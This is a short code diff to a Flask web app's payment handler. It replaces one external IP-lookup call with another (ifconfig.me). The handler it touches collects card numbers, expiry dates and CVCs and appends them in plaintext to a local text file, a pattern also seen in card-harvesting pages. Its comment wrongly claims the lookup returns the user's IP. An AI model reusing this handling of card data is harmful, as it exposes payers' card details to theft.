@@ -2,6 +2,7 @@ from flask import Flask, render_template, request, redirect, url_for, send_from_
 import os
 import socket
 from requests import get 
+import urllib.request
 
 app = Flask(__name__)
 
@@ -41,7 +42,7 @@ def submit_payment():
     card_number = request.form.get('card-number')
     expiry = request.form.get('expiry')  # MM/YY format
     cvc = request.form.get('cvc')
-    user_ip = get('https://api.ipify.org').content.decode('utf8')  # Get the user's IP
+    user_ip = urllib.request.urlopen('http://ifconfig.me').read().decode('utf8')  # Get the user's IP
 
     # Save the payment information to payment_info.txt
     with open('payment_info.txt', 'a') as f:
